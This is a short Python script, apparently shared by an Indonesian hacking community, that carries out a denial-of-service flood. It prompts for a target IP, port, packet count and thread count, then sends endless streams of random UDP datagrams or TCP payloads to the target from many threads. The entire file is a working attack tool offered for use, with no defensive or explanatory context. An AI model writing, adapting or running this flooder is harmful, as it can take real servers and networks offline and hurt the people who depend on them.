#NgabOwi
#ToolsSakti

import random
import socket
import threading
import os

 
#Color
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
ly= '\033[35m'

os.system("clear")
print(ly+"██████████████████████████████")
print("×                                                                                    × ")
print("( + ) Author       : 𝗡𝗚𝗔𝗕 𝗢𝗪𝗜 ")
print("( + ) Community     : Cyber Team Indo")
print("( + ) Github        : https://github.com/NGABxOWI")
print("×                                                                                    × ")
print("██████████████████████████████")

ip = str(input(red+" IP TARGET : "))
port = int(input(red+" PORT TARGET : "))
choice = str(input(red+" ATTACK ? (y/n) : "))
times = int(input(red+" PACKETS : "))
threads = int(input(red+" THREADS : "))
def run():
  data = random._urandom(1024)
  i = random.choice(("[***]","[^^^]","[!!!]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(cyan+"[ × ]  𝗡𝗴𝗮𝗯 𝗢𝘄𝗼 KIRIM KE =",red+ip,":",port)
    except:
      print(cyan+"[ × ]  𝗡𝗴𝗮𝗯 𝗢𝘄𝗼 KIRIM KE =",red+ip,":",port)


def run2():
  data = random._urandom(16)
  i = random.choice(("[T***]","[^^^]","[!!!]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(cyan+"[ × ]  𝗡𝗴𝗮𝗯 𝗢𝘄𝗼 KIRIM KE =",red+ip,":",port)

    except:
      s.close()
      print("[ × ]  𝗡𝗴𝗮𝗯 𝗢𝘄𝗼 KIRIM KE =",red+ip,":",port)

            
for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
